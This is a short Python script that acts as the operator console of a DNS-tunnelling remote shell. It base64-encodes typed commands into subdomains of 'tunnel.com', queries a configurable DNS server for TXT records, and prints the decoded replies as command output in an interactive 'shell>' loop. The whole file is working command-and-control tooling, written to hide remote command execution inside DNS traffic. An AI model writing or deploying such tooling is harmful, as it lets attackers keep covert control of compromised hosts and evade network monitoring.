import base64
import dns.resolver

# Set DNS Server IP (change if remote)
DNS_SERVER = "127.0.0.1"  # Change to your server IP if needed

def send_command_over_dns(command):
    # Encode the command in Base64
    encoded_command = base64.urlsafe_b64encode(command.encode()).decode()
    dns_query = f"{encoded_command}.tunnel.com"

    # Send DNS TXT query
    resolver = dns.resolver.Resolver()
    resolver.nameservers = [DNS_SERVER]

    try:
        response = resolver.resolve(dns_query, "TXT", tcp=True)
        
        # Collect all chunks
        full_encoded_response = []
        for txt_record in response:
            encoded_response = txt_record.to_text().strip('"')

            # Fix Base64 padding
            missing_padding = len(encoded_response) % 4
            if missing_padding:
                encoded_response += '=' * (4 - missing_padding)
            
            full_encoded_response.append(encoded_response)

        # Decode full response
        full_encoded_string = ''.join(full_encoded_response)
        decoded_response = base64.urlsafe_b64decode(full_encoded_string).decode()

        print("[+] Command Output:\n", decoded_response)

    except dns.resolver.NXDOMAIN:
        print("[-] Error: NXDOMAIN - The DNS query name does not exist.")
    except dns.resolver.NoAnswer:
        print("[-] Error: No response received from the DNS server.")
    except Exception as e:
        print(f"[-] Error: {e}")

# Example usage
while True:
    command = input("shell> ")
    if command.lower() in ["exit", "quit"]:
        break
    send_command_over_dns(command)
